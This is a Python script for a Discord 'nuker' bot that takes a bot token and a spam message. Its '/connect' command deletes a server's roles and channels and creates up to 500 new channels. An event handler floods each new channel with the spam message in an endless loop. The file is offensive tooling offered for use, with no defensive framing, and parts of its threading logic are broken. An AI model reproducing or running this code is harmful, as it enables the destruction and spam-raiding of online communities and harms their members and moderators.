import discord
import requests
from discord.ext import commands
from termcolor import colored
import threading
import sys
TOKEN = input(colored('[#] Enter Token: ', 'blue'))
chanless = input(colored('[#] Enter Channel Name: ', 'blue'))
spam = input(colored('[#] Enter Message: ', 'blue'))
MAX_CHANNELS = 500
client = commands.Bot(command_prefix="/")
@client.command()
async def connect(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for role in guild.roles:
        try:
            await role.delete()
            print(colored(f'[+] {role.name} Has Been Deleted', 'green'))
        except:
            for channel in guild.channels:
                        try:
                            await channel.delete()
                            print(colored(f'[+] {channel.name} Has Been Deleted', 'green'))
                        except:
                            print(colored(f'[-] {channel.name} Cant Delete', 'red'))
        try:
            for i in range(MAX_CHANNELS):
                await guild.create_text_channel(chanless)
                print(colored(f'[+] Successfully Created Channel {chanless}', 'green'))
        except:
            print(colored('[-] Failed To Create Channel', 'red'))
@client.event
async def on_guild_channel_create(channel):
    while True:
        try:
            await channel.send(spam)
            print(colored('[+] Message Successfully Sent!', 'green'))
            print(colored(f'[*] Message: {spam}', 'yellow'))
        except:
            print(colored('[-] Spamming Cancelled', 'red'))
def thread():
    threading.Thread(target=connect, args=(client.run(TOKEN))).start()
    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()
thread()